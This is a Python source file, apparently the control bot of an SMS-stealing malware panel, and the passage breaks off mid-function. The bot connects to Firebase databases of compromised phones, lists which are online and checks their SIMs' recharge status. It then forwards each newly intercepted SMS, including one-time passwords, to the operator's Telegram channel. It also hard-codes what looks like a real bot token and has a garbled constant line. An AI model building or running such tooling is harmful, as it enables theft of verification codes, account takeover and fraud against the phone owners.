import telebot
from telebot import types
import pyrebase
import json
import time
import re
import os
import threading
from datetime import datetime, timedelta
import pickle
import random
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = "8696235077:AAFwCoHeYjsIQwm284oDcgvpAoPkq5-NGjM"
ADMIN_ID = 8242927146
CHANNEL_LINK = "https://t.me/+VoXumX1ERYEzMGU1"
CHANNEL_ID = -1003957702322
FIREBASE_DATAFIREBASE_DATA_CHANNEL = -1003832627939_CHANNEL = -1003832627939

DATA_FILE = "bot_data.pkl"
VERSION_FILE = "bot_version.txt"

BOT_VERSION = "4.1.2"
LAST_UPDATE_TIME = datetime.now().strftime('%d/%m/%Y %I:%M:%S %p')

# ==================== Message Lock System ====================
user_locked_messages = {}
# ==================================================================

def get_bot_version():
    try:
        if os.path.exists(VERSION_FILE):
            with open(VERSION_FILE, 'r') as f:
                return f.read().strip()
        return BOT_VERSION
    except:
        return BOT_VERSION

def save_bot_version():
    try:
        with open(VERSION_FILE, 'w') as f:
            f.write(BOT_VERSION)
        logger.info(f"✅ Bot version saved: {BOT_VERSION}")
    except Exception as e:
        logger.error(f"❌ Error saving version: {e}")

def check_user_version(user_id):
    try:
        user_version_file = f"user_version_{user_id}.txt"
        if os.path.exists(user_version_file):
            with open(user_version_file, 'r') as f:
                saved_version = f.read().strip()
                return saved_version == BOT_VERSION
        return False
    except:
        return False

def update_user_version(user_id):
    try:
        user_version_file = f"user_version_{user_id}.txt"
        with open(user_version_file, 'w') as f:
            f.write(BOT_VERSION)
        return True
    except:
        return False

def get_update_message():
    return f"""
╔═══════════════════════════╗
      𝗕𝗢𝗧 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬
╚═══════════════════════════╝

📌 <b>New Version:</b> <code>{BOT_VERSION}</code>
🕐 <b>Update Time:</b> {LAST_UPDATE_TIME}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ <b>IMPORTANT NOTICE</b> ⚠️

Bot has been updated/restarted!
Please click <b>/start</b> to continue using the bot.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ <b>Old commands will not work</b>
✅ <b>Click /start to activate</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 <i>Your previous data is safe and saved</i>
"""

bot = telebot.TeleBot(BOT_TOKEN, threaded=True)

user_states = {}
user_firebase = {}
user_firebase_count = {}
user_connected_device = {}
user_selected_sim = {}
user_channel_data = {}
user_otp_channel = {}
user_last_activity = {}
user_chat_messages = {}
user_balance = {}
user_notify_off = {}
user_all_ids = set()
user_last_hello_message = {}
bot_mode = True

# Token Channel Storage
user_token_channel = {}
user_token_active = {}

# OTP monitoring
otp_monitoring = {}
user_last_message_keys = {}

def save_data():
    try:
        data = {
            'user_firebase': user_firebase,
            'user_firebase_count': user_firebase_count,
            'user_otp_channel': user_otp_channel,
            'user_balance': user_balance,
            'user_notify_off': user_notify_off,
            'user_all_ids': list(user_all_ids),
            'user_connected_device': user_connected_device,
            'user_selected_sim': user_selected_sim,
            'user_channel_data': user_channel_data,
            'user_last_activity': user_last_activity,
            'bot_mode': bot_mode,
            'user_token_channel': user_token_channel,
            'user_token_active': user_token_active,
            'user_locked_messages': {uid: {path: list(keys) for path, keys in paths.items()} for uid, paths in user_locked_messages.items()}
        }
        with open(DATA_FILE, 'wb') as f:
            pickle.dump(data, f)
        logger.info(f"✅ Data saved to {DATA_FILE}")
    except Exception as e:
        logger.error(f"❌ Error saving data: {e}")

def load_data():
    global bot_mode
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'rb') as f:
                data = pickle.load(f)
            
            user_firebase.update(data.get('user_firebase', {}))
            user_firebase_count.update(data.get('user_firebase_count', {}))
            user_otp_channel.update(data.get('user_otp_channel', {}))
            user_balance.update(data.get('user_balance', {}))
            user_notify_off.update(data.get('user_notify_off', {}))
            user_all_ids.update(data.get('user_all_ids', []))
            user_connected_device.update(data.get('user_connected_device', {}))
            user_selected_sim.update(data.get('user_selected_sim', {}))
            user_channel_data.update(data.get('user_channel_data', {}))
            user_last_activity.update(data.get('user_last_activity', {}))
            bot_mode = data.get('bot_mode', True)
            user_token_channel.update(data.get('user_token_channel', {}))
            user_token_active.update(data.get('user_token_active', {}))
            
            loaded_locked = data.get('user_locked_messages', {})
            for uid, paths in loaded_locked.items():
                user_locked_messages[uid] = {path: set(keys) for path, keys in paths.items()}
            
            logger.info(f"✅ Data loaded from {DATA_FILE}")
            logger.info(f"📊 Total Users: {len(user_all_ids)}")
            return True
    except Exception as e:
        logger.error(f"❌ Error loading data: {e}")
        return False

def auto_save():
    while True:
        time.sleep(300)
        save_data()

save_thread = threading.Thread(target=auto_save, daemon=True)
save_thread.start()

def auto_hello_checker():
    while True:
        try:
            current_time = datetime.now()
            for user_id in list(user_last_activity.keys()):
                try:
                    last_active = user_last_activity.get(user_id)
                    if last_active:
                        time_diff = current_time - last_active
                        if time_diff.total_seconds() > 900:
                            if user_id in user_last_hello_message:
                                try:
                                    bot.delete_message(user_id, user_last_hello_message[user_id])
                                except:
                                    pass
                                del user_last_hello_message[user_id]
                            
                            if check_user_version(user_id) or user_id == ADMIN_ID:
                                try:
                                    msg = bot.send_message(user_id, "🩵 𝗛𝗘𝗟𝗟𝗢 𝗜'𝗠 𝗥𝗘𝗔𝗗𝗬 𝗙𝗢𝗥 𝗬𝗢𝗨 🩵")
                                    user_last_hello_message[user_id] = msg.message_id
                                except:
                                    pass
                            user_last_activity[user_id] = current_time
                except:
                    pass
        except:
            pass
        time.sleep(60)

hello_thread = threading.Thread(target=auto_hello_checker, daemon=True)
hello_thread.start()

def check_version_and_notify(user_id, chat_id):
    """Returns True if user can proceed, False if blocked (needs /start)"""
    if user_id == ADMIN_ID:
        return True
    
    if not check_user_version(user_id):
        safe_send_message(chat_id, get_update_message())
        return False
    return True

def update_user_activity(user_id):
    user_last_activity[user_id] = datetime.now()

def safe_send_message(chat_id, text, reply_markup=None, track=True):
    try:
        msg = bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
        return msg
    except Exception as e:
        logger.error(f"Send message error: {e}")
        try:
            msg = bot.send_message(chat_id, text, reply_markup=reply_markup)
            return msg
        except Exception as e2:
            logger.error(f"Plain text send also failed: {e2}")
            return None

def check_bot_mode(user_id):
    if user_id == ADMIN_ID:
        return True
    return bot_mode

def check_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except:
        return False

def count_clients_in_firebase(db):
    try:
        clients = db.child("clients").get()
        count = 0
        if clients.each():
            for _ in clients.each():
                count += 1
        return count
    except:
        return 0

def connect_firebase(db_url):
    try:
        db_url = db_url.strip()
        if not db_url.startswith("https://"):
            return None, None, 0
        
        config = {
            "apiKey": "AIzaSyDummyKeyForRealTimeDB",
            "authDomain": "test.firebaseapp.com",
            "databaseURL": db_url,
            "storageBucket": "test.appspot.com"
        }
        
        firebase = pyrebase.initialize_app(config)
        db = firebase.database()
        db.child("/").get()
        client_count = count_clients_in_firebase(db)
        return firebase, db, client_count
    except Exception as e:
        logger.error(f"Firebase connection error: {e}")
        return None, None, 0

def get_online_clients(db):
    try:
        clients = db.child("clients").get()
        online_clients = []
        if clients.each():
            for client in clients.each():
                client_data = client.val()
                if client_data and client_data.get("status") == True:
                    online_clients.append({
                        "id": client.key(),
                        "data": client_data
                    })
        return online_clients
    except:
        return []

def get_client_by_id(db, client_id):
    try:
        client = db.child("clients").child(client_id).get()
        return client.val()
    except:
        return None

def is_client_online(db, client_id):
    try:
        client = db.child("clients").child(client_id).get()
        client_data = client.val()
        if client_data and client_data.get("status") == True:
            return True
        return False
    except:
        return False

def join_channel(channel_input):
    try:
        channel_input = channel_input.strip()
        
        if "t.me/" in channel_input:
            if "+" in channel_input:
                invite = channel_input.split("+")[-1]
                try:
                    chat = bot.get_chat(f"-100{invite}")
                except:
                    chat = bot.get_chat(f"https://t.me/joinchat/{invite}")
            else:
                username = channel_input.split("t.me/")[-1]
                chat = bot.get_chat(f"@{username}")
        elif channel_input.startswith("-100"):
            chat = bot.get_chat(int(channel_input))
        elif channel_input.startswith("@"):
            chat = bot.get_chat(channel_input)
        else:
            try:
                chat = bot.get_chat(int(channel_input))
            except:
                chat = bot.get_chat(f"@{channel_input}")
        
        return chat.id, chat.title
    except Exception as e:
        logger.error(f"Join channel error: {e}")
        return None, None

def extract_sms_details(msg_text):
    to_number = None
    sms_message = None
    msg_text = msg_text.strip()
    
    to_patterns = [
        r'(?:To|to)\s*(?:\(Tap to copy\))?\s*:\s*([+\d\s-]+)',
        r'(?:📞\s*)?To\s*:\s*([+\d\s-]+)',
        r'(?:Number|Phone|Target)\s*:\s*([+\d\s-]+)',
        r'\+?\d{10,15}',
    ]
    
    for pattern in to_patterns:
        match = re.search(pattern, msg_text)
        if match:
            to_number = match.group(1) if match.lastindex else match.group(0)
            to_number = re.sub(r'[\s-]', '', to_number)
            if len(to_number) == 10:
                to_number = '+91' + to_number
            elif len(to_number) > 10 and not to_number.startswith('+'):
                to_number = '+' + to_number
            break
    
    msg_patterns = [
        r'(?:Massage|massage)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)',
        r'(?:Message|message)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)',
        r'(?:Body|body)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)',
        r'(?:MSG|SMS|Text|Content)\s*:\s*(.+?)(?:\n|$)',
        r'(?:💬\s*)?(?:Message|MSG)\s*:\s*(.+?)(?:\n📋|\n━━|$)',
        r'📋\s*One-tap copy\s*:\s*\n?(.+)',
        r'📋\s*Copy\s*:\s*\n?(.+)',
    ]
    
    for pattern in msg_patterns:
        match = re.search(pattern, msg_text, re.DOTALL | re.IGNORECASE)
        if match:
            sms_message = match.group(1).strip()
            sms_message = sms_message.split('\n')[0].strip()
            break
    
    if not sms_message and to_number:
        lines = msg_text.split('\n')
        for i, line in enumerate(lines):
            if to_number in line.replace(' ', '').replace('-', ''):
                for j in range(i+1, min(i+3, len(lines))):
                    clean_line = lines[j].strip()
                    if clean_line and not clean_line.startswith(('To', '📞', '📱', '👤', '📋', '━━')):
                        sms_message = clean_line
                        break
                break
    
    return to_number, sms_message

def check_recharge_per_sim_smart(db, client_id, sim_number):
    try:
        paths = [
            f"messages/{client_id}",
            f"clients/{client_id}/messages",
            f"Messages/{client_id}",
        ]
        
        cutoff_date = datetime.now() - timedelta(days=10)
        
        recharge_expired_keywords = [
            "recharge expired", "validity expired", "plan expired",
            "recharge your number", "no outgoing", "outgoing barred",
            "incoming barred", "service suspended", "your plan has expired",
            "validity over", "recharge khatam", "plan khatam",
            "recharge due", "insufficient balance", "zero balance",
            "outgoing facility barred", "incoming facility barred",
            "रिचार्ज समाप्त", "रिचार्ज खत्म", "वैधता समाप्त",
            "आउटगोइंग बंद", "इनकमिंग बंद", "सेवा निलंबित",
            "आपका प्लान समाप्त", "प्लान समाप्त", "वैधता खत्म",
            "कृपया रिचार्ज करें", "रिचार्ज करवाएं", "रिचार्ज की आवश्यकता",
            "आपका नंबर बंद", "बैलेंस कम", "शून्य बैलेंस",
            "बैलेंस नहीं", "पर्याप्त बैलेंस नहीं",
            "रीचार्ज एक्सपायर", "रीचार्ज समाप्त", "रीचार्ज खत्म",
        ]
        
        recharge_success_keywords = [
            "recharge successful", "recharge done", "plan activated",
            "your number is recharged", "recharge completed",
            "successfully recharged", "plan renewed", "validity extended",
            "recharge ho gaya", "recharge successful hua",
            "thank you for recharging", "your recharge is successful",
            "रिचार्ज सफल", "रिचार्ज सफलतापूर्वक", "रिचार्ज पूर्ण",
            "आपका रिचार्ज सफल", "प्लान एक्टिवेट", "प्लान सक्रिय",
            "वैधता बढ़ा", "रिचार्ज हो गया", "रिचार्ज सक्सेस",
            "रीचार्ज सफल", "रीचार्ज पूर्ण", "बैलेंस अपडेट",
        ]
        
        all_messages = []
        
        for path in paths:
            try:
                messages = db.child(path).get()
                if messages and messages.each():
                    for msg in messages.each():
                        msg_data = msg.val()
                        if not isinstance(msg_data, dict):
                            continue
                        
                        msg_body = (msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or "").lower()
                        msg_from = msg_data.get("from") or msg_data.get("sender") or msg_data.get("phoneNumber") or msg_data.get("address") or ""
                        
                        msg_time = None
                        ts = msg_data.get("timestamp") or msg_data.get("time") or msg_data.get("date") or msg_data.get("receivedTime") or msg_data.get("sentTime")
                        
                        if ts:
                            try:
                                if isinstance(ts, (int, float)):
                                    if ts > 1000000000000:
                                        msg_time = datetime.fromtimestamp(ts / 1000)
                                    else:
                                        msg_time = datetime.fromtimestamp(ts)
                                elif isinstance(ts, str):
                                    ts_clean = ts.strip().replace('T', ' ').replace('Z', '')
                                    for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M:%S.%f", "%d/%m/%Y %H:%M:%S", "%Y-%m-%dT%H:%M:%S"]:
                                        try:
                                            msg_time = datetime.strptime(ts_clean[:19], fmt)
                                            break
                                        except:
                                            continue
                            except:
                                pass
        
                        if msg_time is None:
                            msg_time = datetime.now()
                        
                        if msg_time >= cutoff_date:
                            sim_clean = sim_number.replace('+91', '').replace('+', '').replace('-', '').replace(' ', '')
                            body_clean = msg_body.replace('-', '').replace(' ', '')
                            from_clean = msg_from.replace('+91', '').replace('+', '').replace('-', '').replace(' ', '')
                            
                            sim_in_msg = (sim_clean in from_clean or 
                                        sim_clean in body_clean or 
                                        sim_clean[-10:] in body_clean or
                                        sim_number in msg_from)
                            
                            if sim_in_msg:
                                all_messages.append({
                                    "time": msg_time,
                                    "body": msg_body,
                                    "from": msg_from
                                })
            except:
                pass
        
        if not all_messages:
            return "✅ AVAILABLE"
        
        all_messages.sort(key=lambda x: x["time"], reverse=True)
        
        last_expired_time = None
        for msg in all_messages:
            if any(keyword in msg["body"] for keyword in recharge_expired_keywords):
                last_expired_time = msg["time"]
                break
        
        if not last_expired_time:
            return "✅ AVAILABLE"
        
        for msg in all_messages:
            if msg["time"] > last_expired_time:
                if any(keyword in msg["body"] for keyword in recharge_success_keywords):
                    return "✅ RECHARGED (After Expiry)"
        
        return "⚠️ EXPIRED (Not Recharged Yet)"
        
    except Exception as e:
        logger.error(f"Recharge check error: {e}")
        return "✅ AVAILABLE"

def find_message_paths_in_db(db, client_id):

    found_paths = []
    
    common_paths = [
        f"messages/{client_id}",
        f"Messages/{client_id}",
        f"clients/{client_id}/messages",
        f"clients/{client_id}/Messages",
        f"devices/{client_id}/messages",
        f"sms/{client_id}",
        f"receivedMessages/{client_id}",
        f"inbox/{client_id}",
    ]
    
    for path in common_paths:
        try:
            test = db.child(path).get()
            if test.val() is not None:
                found_paths.append(path)
        except:
            pass
    
    if not found_paths:
        found_paths = [
            f"messages/{client_id}",
            f"clients/{client_id}/messages",
        ]
    
    return found_paths

def lock_existing_messages(user_id, client_id, db):
    """Lock all existing messages when user connects to a device"""
    try:
        monitor_paths = find_message_paths_in_db(db, client_id)
        
        if user_id not in user_locked_messages:
            user_locked_messages[user_id] = {}
        
        for path in monitor_paths:
            try:
                data = db.child(path).get()
                if data and data.val():
                    current_data = data.val()
                    if isinstance(current_data, dict):
                        if path not in user_locked_messages[user_id]:
                            user_locked_messages[user_id][path] = set()
                        for key in current_data.keys():
                            user_locked_messages[user_id][path].add(key)
                        logger.info(f"🔒 Locked {len(current_data.keys())} existing messages for user {user_id} at path: {path}")
                    elif isinstance(current_data, str):
                        if path not in user_locked_messages[user_id]:
                            user_locked_messages[user_id][path] = set()
                        user_locked_messages[user_id][path].add(hash(current_data))
                        logger.info(f"🔒 Locked single string message for user {user_id} at path: {path}")
            except Exception as e:
                logger.error(f"Error locking messages at path {path}: {e}")
        
        logger.info(f"✅ All existing messages locked for user {user_id}, device {client_id[:12]}...")
        return True
    except Exception as e:
        logger.error(f"❌ Error locking messages: {e}")
        return False

def is_message_locked(user_id, path, msg_key):
    """Check if a message key is already locked"""
    try:
        if user_id not in user_locked_messages:
            return False
        if path not in user_locked_messages[user_id]:
            return False
        return msg_key in user_locked_messages[user_id][path]
    except:
        return False

def lock_message(user_id, path, msg_key):
    """Add message key to lock list after forwarding"""
    try:
        if user_id not in user_locked_messages:
            user_locked_messages[user_id] = {}
        if path not in user_locked_messages[user_id]:
            user_locked_messages[user_id][path] = set()
        user_locked_messages[user_id][path].add(msg_key)
        return True
    except:
        return False

def start_otp_monitoring_for_user(user_id, client_id, db, chat_id=None):
    if user_id in user_last_message_keys:
        del user_last_message_keys[user_id]
    
    monitor_paths = find_message_paths_in_db(db, client_id)
    
    lock_existing_messages(user_id, client_id, db)
    
    if user_id not in user_last_message_keys:
        user_last_message_keys[user_id] = {}
    
    for path in monitor_paths:
        try:
            data = db.child(path).get()
            if data and data.val():
                current_data = data.val()
                if isinstance(current_data, dict):
                    for key in current_data.keys():
                        if path not in user_last_message_keys[user_id]:
                            user_last_message_keys[user_id][path] = set()
                        user_last_message_keys[user_id][path].add(key)
        except:
            pass
    
    otp_monitoring[user_id] = {
        "client_id": client_id,
        "otp_channel_id": user_otp_channel[user_id]["otp_channel_id"],
        "monitor_paths": monitor_paths
    }
    
    if chat_id:
        safe_send_message(chat_id, f"""
𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙤𝙣 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙍𝙚𝙖𝙙𝙞𝙣𝙜 ✅

ɴᴏᴡ ᴄʜᴀᴋ ᴜᴘᴄᴏᴍɪɴɢ ᴄᴏɴɴᴇᴄᴛɪᴏɴ
ᴍᴀꜱꜱᴀɢᴇ ɪɴ ᴏᴛᴘ ᴄʜᴀɴɴᴇʟ
""")
    
    logger.info(f"✅ OTP Monitoring started for user {user_id}, device {client_id[:12]}...")

def forward_sms_to_otp(user_id, otp_info, sms_data):
    try:
        sms_from = sms_data.get("from") or sms_data.get("sender") or sms_data.get("phoneNumber") or sms_data.get("number", "Unknown")
        sms_body = sms_data.get("body") or sms_data.get("message") or sms_data.get("text") or sms_data.get("sms", "No message")
        sms_time = sms_data.get("time") or sms_data.get("timestamp") or datetime.now().strftime("%H:%M:%S")
        
        if sms_from == "Unknown" and sms_body == "No message":
            return
        
        otp_channel_id = otp_info["otp_channel_id"]
        
        # PLAIN TEXT - supports ALL special characters & emojis
        otp_msg = f"""
╔════════════════════════╗
      📱 𝗡𝗘𝗪 𝗦𝗠𝗦 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗        
╚════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 𝗙𝗿𝗼𝗺: {sms_from}
━━━━━━━━━━━━━━━━━━━━━━━━━━

📝 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:
{sms_body}

🕐 𝗧𝗶𝗺𝗲: {sms_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 Tap on the code to copy it
"""
        bot.send_message(otp_channel_id, otp_msg)
        logger.info(f"✅ OTP forwarded to channel {otp_channel_id}")
    except Exception as e:
        logger.error(f"❌ Forward error: {e}")

# ==================== FIXED: Only monitor CONNECTED DEVICE messages ====================
def otp_sms_monitor():
    while True:
        try:
            for user_id, otp_info in list(otp_monitoring.items()):
                # Check if user still has Firebase connected
                if user_id not in user_firebase:
                    continue
                
                # Check if user still has a device connected
                if user_id not in user_connected_device:
                    continue
                
                # GET CONNECTED DEVICE'S CLIENT ID
                connected_client_id = user_connected_device[user_id].get("client_id")
                if not connected_client_id:
                    continue
                
                # ONLY proceed if the OTP monitoring is for the CURRENTLY CONNECTED device
                if otp_info.get("client_id") != connected_client_id:
                    continue
                
                fb_list = user_firebase.get(user_id, {})
                if not fb_list:
                    continue
                
                if user_id not in user_last_message_keys:
                    user_last_message_keys[user_id] = {}
                
                monitor_paths = otp_info.get("monitor_paths", [])
                user_keys = user_last_message_keys[user_id]
                
                # Only check the FIRST firebase (or the one matching connected device's fb_id)
                connected_fb_id = user_connected_device[user_id].get("fb_id", "1")
                
                for fb_id, fb_data in fb_list.items():
                    # ONLY monitor the firebase that has the connected device
                    if fb_id != connected_fb_id:
                        continue
                    
                    try:
                        db = fb_data["db"]
                        
                        for path in monitor_paths:
                            try:
                                data = db.child(path).get()
                                if not data or not data.val():
                                    continue
                                
                                current_data = data.val()
                                
                                if isinstance(current_data, dict):
                                    for msg_key, msg_val in current_data.items():
                                        if isinstance(msg_val, dict):
                                            if not is_message_locked(user_id, path, msg_key) and msg_key not in user_keys.get(path, set()):
                                                if path not in user_keys:
                                                    user_keys[path] = set()
                                                user_keys[path].add(msg_key)
                                                forward_sms_to_otp(user_id, otp_info, msg_val)
                                                lock_message(user_id, path, msg_key)
                                                save_data()
                                        elif isinstance(msg_val, str):
                                            msg_hash = f"{msg_key}_{hash(msg_val)}"
                                            if not is_message_locked(user_id, path, msg_hash) and msg_hash not in user_keys.get(path, set()):
                                                if path not in user_keys:
                                                    user_keys[path] = set()
                                                user_keys[path].add(msg_hash)
                                                forward_sms_to_otp(user_id, otp_info, {"body": current_data})
                                                lock_message(user_id, path, msg_hash)
                                                save_data()
                                                break
                                elif isinstance(current_data, str):
                                    msg_hash = hash(current_data)
                                    if not is_message_locked(user_id, path, msg_hash) and msg_hash not in user_keys.get(path, set()):
                                        if path not in user_keys:
                                            user_keys[path] = set()
                                        user_keys[path].add(msg_hash)
                                        forward_sms_to_otp(user_id, otp_info, {"body": current_data})
                                        lock_message(user_id, path, msg_hash)
                                        save_data()
                            
                            except:
                                pass
                            time.sleep(0.2)
                        
                        break  # Only process one firebase (the connected one)
                        
                    except Exception as e:
                        logger.error(f"FB error: {e}")
                        
        except Exception as e:
            logger.error(f"OTP Monitor Error: {e}")
        time.sleep(0.5)
# =====================================================================================

otp_thread = threading.Thread(target=otp_sms_monitor, daemon=True)
otp_thread.start()

# ==================== /start COMMAND ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_id = user.id
    chat_id = message.chat.id
    
    update_user_version(user_id)
    update_user_activity(user_id)
    user_all_ids.add(user_id)
    save_data()
    
    first_name = user.first_name or ""
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    
    welcome_msg = f"""
═════════════════════════
     ✨ 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗢𝗧 ✨          
═════════════════════════

📌 <b>Version:</b> <code>{BOT_VERSION}</code>
🕐 <b>Last Update:</b> {LAST_UPDATE_TIME}

━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    if user_id == ADMIN_ID:
        safe_send_message(chat_id, welcome_msg + """
🔥 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗢𝗪𝗡𝗘𝗥 𝗢𝗙 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 🔥

𝗛𝗢𝗪 𝗔𝗥𝗘 𝗙𝗘𝗘𝗟 𝗧𝗢𝗗𝗔𝗬 ?
𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗙𝗜𝗥𝗘 𝗢𝗡 𝗬𝗢𝗨𝗥 𝗦𝗬𝗦𝗧𝗘𝗠

⚡ 𝗕𝗢𝗧 𝗢𝗡𝗟𝗜𝗡𝗘 ⚡
""")
        show_main_menu(chat_id, is_admin=True)
    else:
        if not check_bot_mode(user_id):
            safe_send_message(chat_id, welcome_msg + """
❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌

𝗣𝗟𝗘𝗔𝗦𝗘 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥
         ☠️ @s4_tg2 ☠️
""")
            return
        
        safe_send_message(chat_id, welcome_msg + f"""
💎 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗨𝗦𝗘𝗥 💎

𝗛𝗢𝗪 𝗔𝗥𝗘 𝗬𝗢𝗨 𝗗𝗢𝗜𝗡𝗚 ? 𝗪𝗘𝗟𝗟 𝗚𝗢𝗢𝗗 👍

{full_name}

𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 𝗦𝗣𝗘𝗖𝗜𝗔𝗟𝗟𝗬 𝗗𝗘𝗦𝗜𝗚𝗡𝗘𝗗 𝗕𝗬 𝗬𝗢𝗨𝗥 𝗣𝗔𝗡𝗘𝗟
""")
        
        if not check_user_joined(user_id):
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url=CHANNEL_LINK),
                types.InlineKeyboardButton("💓 𝗩𝗘𝗥𝗜𝗙𝗬 💓", callback_data="verify")
            )
            safe_send_message(chat_id, """
👋 𝗛𝗘𝗬 𝗕𝗥𝗢𝗧𝗛𝗘𝗥 

𝗧𝗛𝗜𝗦 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗 

𝗖𝗹𝗶𝗰𝗸 𝗯𝘂𝘁𝘁𝗼𝗻 𝘁𝗼 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗵𝗲𝗻 𝗰𝗹𝗶𝗰𝗸 𝘃𝗲𝗿𝗶𝗳𝘆
""", reply_markup=keyboard)
        else:
            show_main_menu(chat_id)

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_user(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "🔄 Bot updated! Please /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "❌ Bot is OFF!", show_alert=True)
        return
    
    if check_user_joined(user_id):
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        safe_send_message(chat_id, "𝗕𝗢𝗧 𝗜𝗦 𝗥𝗘𝗔𝗗𝗬 𝗙𝗢𝗥 𝗬𝗢𝗨 🩵")
        show_main_menu(chat_id)
    else:
        bot.answer_callback_query(call.id, "𝗬𝗼𝘂 𝗵𝗮𝘃𝗲 𝗻𝗼𝘁 𝗷𝗼𝗶𝗻𝗲𝗱 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘆𝗲𝘁! ❌", show_alert=True)

def show_main_menu(chat_id, is_admin=False):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn1 = types.KeyboardButton("𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘")
    btn2 = types.KeyboardButton("𝗢𝗡𝗟𝗜𝗡𝗘")
    btn3 = types.KeyboardButton("𝗗𝗜𝗦𝗖𝗢𝗡𝗡𝗘𝗖𝗧")
    btn5 = types.KeyboardButton("𝗢𝗧𝗣 𝗖𝗛𝗔𝗡𝗡𝗘𝗟")
    btn6 = types.KeyboardButton("𝗟𝗢𝗚𝗢𝗨𝗧")
    btn8 = types.KeyboardButton("🔍 𝗦𝗘𝗔𝗥𝗖𝗛 🔍")
    btn10 = types.KeyboardButton("𝗧𝗢𝗞𝗘𝗡 𝗖𝗡")
    
    keyboard.add(btn1, btn2)
    keyboard.add(btn3, btn5)
    keyboard.add(btn6, btn8)
    keyboard.add(btn10)
    
    if is_admin:
        btn4 = types.KeyboardButton("⚙️ 𝗕𝗢𝗧 𝗠𝗢𝗗𝗘")
        btn7 = types.KeyboardButton("📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧")
        keyboard.add(btn4, btn7)
    
    welcome_text = """
═══════════════════
     ✨ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨 ✨       
═══════════════════

🔹 <b>Select an option below</b> 🔹

💡 <i>Click any button to continue</i>
"""
    safe_send_message(chat_id, welcome_text, reply_markup=keyboard)

@bot.message_handler(func=lambda message: message.text == "𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘")
def firebase_handler(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, """
❌ 𝗕𝗢𝗧 𝗖𝗨𝗥𝗥𝗘𝗡𝗧𝗟𝗬 𝗢𝗙𝗙 ❌

𝗣𝗟𝗘𝗔𝗦𝗘 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥
         ☠️ @s4_tg2 ☠️
""")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "𝗣𝗹𝗲𝗮𝘀𝗲 𝗷𝗼𝗶𝗻 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁! ❌")
        return
    
    fb_count = user_firebase_count.get(user_id, 0)
    if fb_count > 0:
        safe_send_message(chat_id, f"""
🩸 𝗬𝗼𝘂𝗿 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱

𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘- {fb_count}

𝗡𝗲𝗲𝗱 𝗟𝗢𝗚𝗢𝗨𝗧 𝗙𝗜𝗥𝗘𝗕𝗔𝗦𝗘 𝘂𝘀𝗲 𝗟𝗢𝗚𝗢𝗨𝗧 𝗯𝘂𝘁𝘁𝗼𝗻
""")
    
